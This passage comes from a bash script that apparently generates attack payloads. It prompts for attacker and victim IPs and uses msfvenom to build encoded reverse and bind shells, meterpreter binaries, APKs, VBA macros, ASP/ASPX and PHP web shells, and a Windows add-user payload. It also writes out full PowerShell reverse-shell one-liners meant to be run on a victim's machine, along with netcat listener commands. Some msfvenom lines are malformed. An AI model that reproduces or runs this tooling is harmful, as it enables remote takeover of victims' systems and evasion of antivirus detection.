            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f elf > Payload_List/Binary/Meterpreter_Binaries/Staged/x64_Rev_TCP.elf
            msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=$VI LPORT=$PO -f elf > Payload_List/Binary/Meterpreter_Binaries/Staged/x86_Bind_TCP.elf
            msfvenom -p linux/x64/meterpreter/bind_tcp RHOST=$VI LPORT=$PO -f elf > Payload_List/Binary/Meterpreter_Binaries/Staged/x64_Bind_TCP.elf
        ### shikata_ga_nai Payloads
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Meterpreter_Binaries/Staged/x86_Rev_TCP_shikata.elf
            msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=$VI LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Meterpreter_Binaries/Staged/x86_Bind_TCP_shikata.elf
        ### zutto_dekiru Payloads
            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x64/zutto_dekiru -i $SH > Payload_List/Binary/Meterpreter_Binaries/Staged/x64_Rev_TCP_zutto_dekiru.elf
            msfvenom -p linux/x64/meterpreter/bind_tcp RHOST=$VI LPORT=$PO -f elf -e x64/zutto_dekiru -i $SH > Payload_List/Binary/Meterpreter_Binaries/Staged/x64_Bind_TCP_zutto_dekiru.elf
        echo -e "\n${BLUE}[+] Creating Meterpreter Stageless Payload:${XX}"
        mkdir Payload_List/Binary/Meterpreter_Binaries/Stageless 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with multi_handler_____[*]" > Payload_List/Binary/Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "[*] Set the payload as following:" >> Payload_List/Binary/Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n- set payload linux/x86/meterpreter_reverse_tcp for shell-x86.elf" >> Payload_List/Binary/Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n- set payload linux/x86/meterpreter_reverse_tcp for shell-x64.elf" >> Payload_List/Binary/Meterpreter_Binaries/Stageless/Read_Me.txt
            msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f elf > Payload_List/Binary/Meterpreter_Binaries/Stageless/shell-x86.elf
            msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f elf > Payload_List/Binary/Meterpreter_Binaries/Stageless/shell-x64.elf
        ### shikata_ga_nai Payloads
            msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Meterpreter_Binaries/Stageless/shell-x86-shikata.elf
        ### zutto_dekiru Payloads
            msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x64/zutto_dekiru -i $SH > Payload_List/Binary/Meterpreter_Binaries/Stageless/shell-x64-zutto_dekiru.elf
        echo -e "\n${BLUE}[+] Creating Non_Meterpreter Staged Payload:${XX}"
        mkdir Payload_List/Binary 2>/dev/null
        mkdir Payload_List/Binary/Non_Meterpreter_Binaries 2>/dev/null
        mkdir Payload_List/Binary/Non_Meterpreter_Binaries/Staged 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with multi_handler or netcat_____[*]" > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n[*] If netcat, run the following command on Attaker PC:" >> Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n[*] Run the following command on Attacker PC for Bind shell:" >> Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "    nc -nvp $PO $VI" >> Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n[*] If multi_handler, set the payload as following:" >> Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n- set payload linux/x86/shell/reverse_tcp for shell-x86.elf" >> Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n- set payload linux/x64/shell/reverse_tcp for shell-x64.elf" >> Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n- set payload linux/x64/shell/bind_tcp for x64_Shell_Bind_TCP.elf" >> Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            msfvenom -p linux/x86/shell/reverse_tcp LHOST=$IP LPORT=$PO -f elf > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/shell-x86.elf
            msfvenom -p linux/x64/shell/reverse_tcp LHOST=$IP LPORT=$PO -f elf > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/shell-x64.elf
            msfvenom -p linux/x64/shell/bind_tcp RHOST=$VI LPORT=$PO -f elf > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/x64_Shell_Bind_TCP.elf
        ### shikata_ga_nai Payloads
            msfvenom -p linux/x86/shell/reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/shell-x86-shikata.elf
        ### zutto_dekiru Payloads
            msfvenom -p linux/x64/shell/reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x64/zutto_dekiru -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/shell-x64-zutto_dekiru.elf
            msfvenom -p linux/x64/shell/bind_tcp LHOST=$IP LPORT=$PO -f elf -e x64/zutto_dekiru -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/x64_Shell_Bind_TCP-zutto_dekiru.elf
        echo -e "\n${BLUE}[+] Creating Non_Meterpreter Stageless Payload:${XX}"
        mkdir Payload_List/Binary 2>/dev/null
        mkdir Payload_List/Binary/Non_Meterpreter_Binaries 2>/dev/null
        mkdir Payload_List/Binary/Non_Meterpreter_Binaries/Stageless 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with multi_handler or netcat_____[*]" > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n[*] If netcat, run the following command on Attaker PC:" >> Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n[*] Run the following command on Attacker PC for Bind shell:" >> Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "    nc -nvp $PO $VI" >> Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n[*] If multi_handler, set the payload as following:" >> Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n- set payload linux/x86/shell_reverse_tcp for x86_shell_rev.elf" >> Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n- set payload linux/x64/shell_reverse_tcp for x64_shell_rev.elf" >> Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n- set payload generic/shell_bind_tcp for generic_bind_shell.elf" >> Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n- set payload linux/x64/shell_bind_tcp for x64_Bind_TCP.elf" >> Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            msfvenom -p linux/x86/shell_reverse_tcp LHOST=$IP LPORT=$PO -f elf > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/x86_shell_rev.elf
            msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=$PO -f elf > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/x64_shell_rev.elf
            msfvenom -p generic/shell_bind_tcp LHOST=$IP LPORT=$PO -f elf > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/generic_bind_shell.elf
            msfvenom -p linux/x64/shell_bind_tcp LHOST=$IP LPORT=$PO -f elf > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/x64_Bind_TCP.elf
        ### shikata_ga_nai Payloads
            msfvenom -p linux/x86/shell_reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/x86_shell_rev-shikata.elf
            msfvenom -p generic/shell_bind_tcp LHOST=$IP LPORT=$PO -f elf x86/shikata_ga_nai -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/generic_bind_shell-shikata.elf
        ### zutto_dekiru Payloads
            msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x64/zutto_dekiru -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/x64_shell_rev-zutto_dekiru.elf
            msfvenom -p linux/x64/shell_bind_tcp LHOST=$IP LPORT=$PO -f elf x64/zutto_dekiru -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/x64_Bind_TCP-zutto_dekiru.elf
        echo -e "\n${RED}DONE, look into Payload_List/Binary${XX}"
    fi
elif [[ $input == "2" ]]; then ## Windows
    echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
    echo -e "${RED} \t\t ════════════════════════════════════════════[ Windows Payload ]═════════════════════════════════════════ ${XX}"
    echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
    echo -e "\n${BLUE}╔═════{ Enter the following details :${XX}"
        read -p "Attacker IP Address: " IP
        read -p "Victim IP Address: " VI
        read -p "Listener Port: " PO
        read -p "Encod Iteration: " SH
    echo -e "\n${BLUE}╔═════{ Type of Shell:${XX}"   
        echo -e "══{1. Powershell"
        echo -e "══{2. Meterpreter"
        echo -e "══{3. Creat user acount"
        echo -e "══{4. http"
        echo -e "══{5. macros"
        echo -e "══{6. ASP/ASPX"
        echo -e "══{7. PHP"
    read -p "[+] Type?  " ty
    if [[ $ty == "1" ]]; then
        echo -e "\n${BLUE}[+] Powershell:${XX}"
        mkdir Payload_List/Powershell 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with netcat listener_____[*]" > Payload_List/Powershell/Shell_list.txt
            echo -e "\n[*] Run the following command on Attacker PC:" >> Payload_List/Powershell/Shell_list.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Powershell/Shell_list.txt
            echo -e "[*] Run any of the following command on Victim PC:" >> Payload_List/Powershell/Shell_list.txt
            echo -e "\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$IP",$PO);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" >> Payload_List/Powershell/Shell_list.txt
            echo -e '\npowershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient($IP,$PO);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"' >> Payload_List/Powershell/Shell_list.txt
            echo -e "\n${RED}Done, Read Payload_List/Powershell/Shell_list.txt${XX}"
    elif [[ $ty == "2" ]]; then
        mkdir Payload_List/Meterpreter_Binaries 2>/dev/null
        mkdir Payload_List/Non_Meterpreter_Binaries 2>/dev/null
        echo -e "\n${BLUE}[+] Creating Meterpreter Staged Payload:${XX}"
        mkdir Payload_List/Meterpreter_Binaries/Staged 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with multi_handler_____[*]" > Payload_List/Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "[*] Set the payload as following:" >> Payload_List/Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n- set payload windows/meterpreter/reverse_tcp for shell-x86.exe" >> Payload_List/Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n- set payload windows/x64/meterpreter/reverse_tcp for shell-x64.exe" >> Payload_List/Meterpreter_Binaries/Staged/Read_Me.txt
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/Meterpreter_Binaries/Staged/shell-x86.exe
            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/Meterpreter_Binaries/Staged/shell-x64.exe
        ### shikata_ga_nai Payloads
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x86/shikata_ga_nai -i $SH > Payload_List/Meterpreter_Binaries/Staged/shell-x86_shikata.exe
        ### zutto_dekiru Payloads
            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x64/zutto_dekiru -i $SH > Payload_List/Meterpreter_Binaries/Staged/shell-x64_zutto_dekiru.exe
        echo -e "\n${BLUE}[+] Creating Meterpreter Stageless Payload:${XX}"
        mkdir Payload_List/Meterpreter_Binaries/Stageless 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with multi_handler_____[*]" > Payload_List/Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "[*] Set the payload as following:" >> Payload_List/Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n- set payload wwindows/meterpreter_reverse_tcp for shell-x86.exe" >> Payload_List/Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n- set payload windows/x64/meterpreter_reverse_tcp for shell-x64.exe" >> Payload_List/Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n- set payload windows/meterpreter_bind_tcp for meter_bind_tcp.exe" >> Payload_List/Meterpreter_Binaries/Stageless/Read_Me.txt
            msfvenom -p windows/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/Meterpreter_Binaries/Stageless/shell-x86.exe
            msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/Meterpreter_Binaries/Stageless/shell-x64.exe
            msfvenom -p windows/meterpreter_bind_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/Meterpreter_Binaries/Stageless/meter_bind_tcp.exe
        ### shikata_ga_nai Payloads
            msfvenom -p windows/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x86/shikata_ga_nai -i $SH > Payload_List/Meterpreter_Binaries/Stagelessshell-x86_shikata.exe
            msfvenom -p windows/meterpreter_bind_tcp LHOST=$IP LPORT=$PO -f exe -e x86/shikata_ga_nai -i $SH > Payload_List/Meterpreter_Binaries/Stageless/meter_bind_tcp_shikata.exe
        ### zutto_dekiru Payloads
            msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x64/zutto_dekiru -i $SH > Payload_List/Meterpreter_Binaries/Stagelessshell-x64_zutto_dekiru.exe
        echo -e "\n${BLUE}[+] Creating Non Meterpreter Staged Payload:${XX}"
        mkdir Payload_List/Non_Meterpreter_Binaries/Staged 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with multi_handler or netcat_____[*]" > Payload_List/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n[*] If netcat, run the following command on Attaker PC:" >> Payload_List/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n[*] If multi_handler, set the payload as following:" >> Payload_List/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n- set payload windows/shell/reverse_tcp for shell-x86.exe" >> Payload_List/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            msfvenom -p windows/shell/reverse_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/Non_Meterpreter_Binaries/Staged/shell-x86.exe
        ### shikata_ga_nai Payloads
            msfvenom -p windows/shell/reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x86/shikata_ga_nai -i $SH > Payload_List/Non_Meterpreter_Binaries/Staged/shell-x86-shikata.exe
        echo -e "\n${BLUE}[+] Creating Non Meterpreter Stageless Payload:${XX}"
        mkdir Payload_List/Non_Meterpreter_Binaries/Stageless 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with multi_handler or netcat_____[*]" > Payload_List/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n[*] If netcat, run the following command on Attaker PC:" >> Payload_List/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n[*] If multi_handler, set the payload as following:" >> Payload_List/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n- set payload windows/shell_reverse_tcp for x86_shell.exe" >> Payload_List/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n- set payload windows/x64/shell_reverse_tcp for x64_shell.exe" >> Payload_List/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
            msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/Non_Meterpreter_Binaries/Stageless/x86_shell.exe
            msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/Non_Meterpreter_Binaries/Stageless/x64_shell.exe
        ### shikata_ga_nai Payloads
            msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x86/shikata_ga_nai -i $SH > Payload_List/Non_Meterpreter_Binaries/Stageless/shell_shikata.exe
        ### zutto_dekiru Payloads
            msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PO -f exe -e x64/zutto_dekiru -i $SH > Payload_List/Non_Meterpreter_Binaries/Stageless/x64_shell_zutto_dekiru.exe
            echo -e "\n${RED}DONE, look into Payload_List${XX}"
    elif [[ $ty == "3" ]]; then
        echo -e "\n${BLUE}[+] Creating User_Account Payload:${XX}"
        mkdir Payload_List/User_Account 2>/dev/null
            echo -e "\nPassword Should be complex:${XX}"
            read -p "Username: " US
            read -p "Password: " PS
            msfvenom -p windows/adduser -f exe USER=$US PASS=$PS -e x86/shikata_ga_nai -i $SH -o Payload_List/User_Account/account.exe
            echo -e "\n${RED}DONE, look into Payload_List/User_Account${XX}"
    elif [[ $ty == "4" ]]; then
        echo -e "\n${BLUE}[+] Creating http Payload:${XX}"
        mkdir Payload_List/http 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with multi_handler_____[*]" > Payload_List/http/Read_Me.txt
            echo -e "[*] Set the payload as following:" >> Payload_List/http/Read_Me.txt
            echo -e "\n- set payload windows/meterpreter/reverse_http for rev_http.exe" >> Payload_List/http/Read_Me.txt
            echo -e "\n- set payload windows/meterpreter_reverse_http for metpret_rev_http.exe" >> Payload_List/http/Read_Me.txt
            msfvenom -p windows/meterpreter/reverse_http LHOST=$IP LPORT=$PO  -f exe > Payload_List/http/rev_http.exe
            msfvenom -p windows/meterpreter_reverse_http LHOST=$IP LPORT=$PO HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > Payload_List/http/metpret_rev_http.exe
        echo -e "\n${RED}DONE, look into Payload_List/http${XX}"
    elif [[ $ty == "5" ]]; then
        echo -e "\n${BLUE}[+] Creating macros Payload:${XX}"
        mkdir Payload_List/macros 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with multi_handler_____[*]" > Payload_List/macros/Read_Me.txt
            echo -e "[*] https://www.offensive-security.com/metasploit-unleashed/vbscript-infection-methods/" >> Payload_List/macros/Read_Me.txt
            echo -e "[*] Set the payload as following:" >> Payload_List/macros/Read_Me.txt
            echo -e "\n- set payload windows/meterpreter/reverse_tcp for macros.txt" >> Payload_List/macros/Read_Me.txt
            echo -e "\n- set payload windows/shell/reverse_tcp for shell_macros.txt" >> Payload_List/macros/Read_Me.txt
            echo -e "\n- set payload windows/shell_reverse_tcp for shell_rev_macros.txt" >> Payload_List/macros/Read_Me.txt
            msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -e x86/shikata_ga_nai -f vba-exe -o Payload_List/macros/macros.txt
            msfvenom -p windows/shell/reverse_tcp LHOST=$IP LPORT=$PO -f exe > Payload_List/macros/shell_macros.txt
            msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f vba-exe > Payload_List/macros/shell_rev_macros.txt          
        echo -e "\n${RED}DONE, look into Payload_List/macros${XX}"
    elif [[ $ty == "6" ]]; then
        echo -e "\n${BLUE}[+] Creating ASP/ASPX Payload:${XX}"
        mkdir Payload_List/ASP_ASPX 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with multi_handler or netcat_____[*]" > Payload_List/ASP_ASPX/Read_Me.txt
            echo -e "[*] You may use netcat for shell_rev.asp & shell_rev.aspx" >> Payload_List/ASP_ASPX/Read_Me.txt
            echo -e "\n[*] If multi_handler, set the payload as following:" >> Payload_List/ASP_ASPX/Read_Me.txt
            echo -e "\n- set payload windows/meterpreter/reverse_tcp for meterpreter.asp" >> Payload_List/ASP_ASPX/Read_Me.txt
            echo -e "\n- set payload windows/meterpreter/reverse_tcp for meterpreter.aspx" >> Payload_List/ASP_ASPX/Read_Me.txt
            echo -e "\n- set payload windows/shell_reverse_tcp for shell_rev.asp" >> Payload_List/ASP_ASPX/Read_Me.txt
            echo -e "\n- set payload windows/shell_reverse_tcp for shell_rev.aspx" >> Payload_List/ASP_ASPX/Read_Me.txt
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f asp > Payload_List/ASP_ASPX/meterpreter.asp
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f aspx > Payload_List/ASP_ASPX/meterpreter.aspx
            msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f asp > Payload_List/ASP_ASPX/shell_rev.asp
            msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f aspx > Payload_List/ASP_ASPX/shell_rev.aspx
        ### shikata_ga_nai Payloads
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f asp x86/shikata_ga_nai -i $SH > Payload_List/ASP_ASPX/meterpreter_shikata.asp
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f aspx x86/shikata_ga_nai -i $SH > Payload_List/ASP_ASPX/meterpreter_shikata.aspx
            msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f asp x86/shikata_ga_nai -i $SH > Payload_List/ASP_ASPX/shell_rev_shikata.asp
            msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PO -f aspx x86/shikata_ga_nai -i $SH > Payload_List/ASP_ASPX/shell_rev_shikata.aspx
        echo -e "\n${RED}DONE, look into Payload_List/ASP_ASPX${XX}"
    elif [[ $ty == "7" ]]; then
        echo -e "\n${BLUE}[+] Creating PHP Payload:${XX}"
        mkdir Payload_List/PHP 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with multi_handler or netcat_____[*]" > Payload_List/PHP/Read_Me.txt
            echo -e "[*] You may use netcat for Rev_TCP.php" >> Payload_List/PHP/Read_Me.txt
            echo -e "\n[*] If multi_handler, set the payload as following:" >> Payload_List/PHP/Read_Me.txt
            echo -e "\n- set php/meterpreter_reverse_tcp for meterpreter1.php" >> Payload_List/PHP/Read_Me.txt
            echo -e "\n- set php/meterpreter/reverse_tcp for meterpreter2.php" >> Payload_List/PHP/Read_Me.txt
            echo -e "\n- set php/reverse_php for Rev_TCP.php" >> Payload_List/PHP/Read_Me.txt
            msfvenom -p php/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f raw > Payload_List/PHP/meterpreter1.php
            msfvenom -p php/meterpreter/reverse_tcp -f raw lhost=$IP lport=$PO > Payload_List/PHP/meterpreter2.php
            msfvenom -p php/reverse_php LHOST=$IP LPORT=$PO -f raw > Payload_List/PHP/Rev_TCP.php
        ### shikata_ga_nai Payloads
            msfvenom -p php/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f raw x86/shikata_ga_nai -i $SH > Payload_List/PHP/meterpreter1_shikata.php
            msfvenom -p php/meterpreter/reverse_tcp lhost=$IP lport=$PO -f raw x86/shikata_ga_nai -i $SH > Payload_List/PHP/meterpreter2_shikata.php
            msfvenom -p php/reverse_php LHOST=$IP LPORT=$PO -f raw x86/shikata_ga_nai -i $SH > Payload_List/PHP/Rev_TCP_shikata.php
    fi
elif [[ $input == "3" ]]; then ## MacOS
    echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
    echo -e "${RED} \t\t ═════════════════════════════════════════════[ MacOS Payload ]══════════════════════════════════════════ ${XX}"
    echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
    echo -e "\n${BLUE}╔═════{ Enter the following details :${XX}"
        read -p "Attacker IP Address: " IP
        read -p "Victim IP Address: " VI
        read -p "Listener Port: " PO
        read -p "Encod Iteration: " SH
    echo -e "\n${BLUE}[+] Creating Payload using msfvenom:${XX}"
    mkdir Payload_List/Mac 2>/dev/null
        echo -e "[*]_____The following Reverse Shell will run with multi_handler or netcat_____[*]" > Payload_List/Mac/Read_Me.txt
        echo -e "\n[*] If netcat, run the following command on Attaker PC:" >> Payload_List/Mac/Read_Me.txt
        echo -e "    nc -nlvp $PO" >> Payload_List/Mac/Read_Me.txt
        echo -e "\n[*] Run the following command on Attacker PC for Bind shell:" >> Payload_List/Mac/Read_Me.txt
        echo -e "    nc -nvp $PO $VI" >> Payload_List/Mac/Read_Me.txt
        echo -e "\n[*] If multi_handler, set the payload as following:" >> Payload_List/Mac/Read_Me.txt
        echo -e "\n- set payload osx/x86/shell_reverse_tcp for Rev_TCP.macho" >> Payload_List/Mac/Read_Me.txt
        echo -e "\n- set payload osx/x86/shell_bind_tcp for Bind_TCP.macho" >> Payload_List/Mac/Read_Me.txt
        msfvenom -p osx/x86/shell_reverse_tcp LHOST=$IP LPORT=$PO -f macho > Payload_List/Mac/Rev_TCP.macho
        msfvenom -p osx/x86/shell_bind_tcp RHOST=$VI LPORT=$PO -f macho > Payload_List/Mac/Bind_TCP.macho
    ### shikata_ga_nai Payloads
        msfvenom -p osx/x86/shell_reverse_tcp LHOST=$IP LPORT=$PO -f macho -e x86/shikata_ga_nai -i $SH > Payload_List/Mac/Rev_TCP_shikata.macho
        msfvenom -p osx/x86/shell_bind_tcp RHOST=$VI LPORT=$PO -f macho -e x86/shikata_ga_nai -i $SH > Payload_List/Mac/Bind_TCP_shikata.macho
        echo -e "\n${RED}DONE, look into Payload_List/Mac${XX}"
elif [[ $input == "4" ]]; then ## Andriod
    echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
    echo -e "${RED} \t\t ════════════════════════════════════════════[ Andriod Payload ]═════════════════════════════════════════ ${XX}"
    echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
    echo -e "\n${BLUE}╔═════{ Enter the following details :${XX}"
        read -p "Attacker IP Address: " IP
        read -p "Victim IP Address: " VI
        read -p "Listener Port: " PO
    echo -e "\n${BLUE}[+] Creating Payload using msfvenom:${XX}"
    mkdir Payload_List/Andriod 2>/dev/null
        echo -e "[*] The following reverse shell will run with multi_handler____[*]" > Payload_List/Andriod/Read_Me.txt
        echo -e "[*] You may use netcat for Rev_TCP.apk & Rev_Shell_TCP.apk" >> Payload_List/Andriod/Read_Me.txt
        echo -e "\n[*] If multi_handler, set the payload as following:" >> Payload_List/Andriod/Read_Me.txt
        echo -e "\n- set payload android/meterpreter/reverse_tcp for Rev_TCP.apk" >> Payload_List/Andriod/Read_Me.txt
        echo -e "\n- set payload/android/shell/reverse_tcp for Rev_Shell_TCP.apk" >> Payload_List/Andriod/Read_Me.txt
        echo -e "\n- set android/meterpreter/reverse_tcp for dalvik.apk" >> Payload_List/Andriod/Read_Me.txt
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO R > Payload_List/Andriod/Rev_TCP.apk
        msfvenom -a dalvik --platform android -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO R -o Payload_List/Andriod/dalvik.apk
        msfvenom -p payload/android/shell/reverse_tcp LHOST=$IP LPORT=$PO R > Payload_List/Andriod/Rev_Shell_TCP.apk
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║https://www.infosecmatter.com/metasploit-module-library/?mm=payload/android/shell/reverse_http                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n${RED}DONE, look into Payload_List/Andriod${XX}"
fi
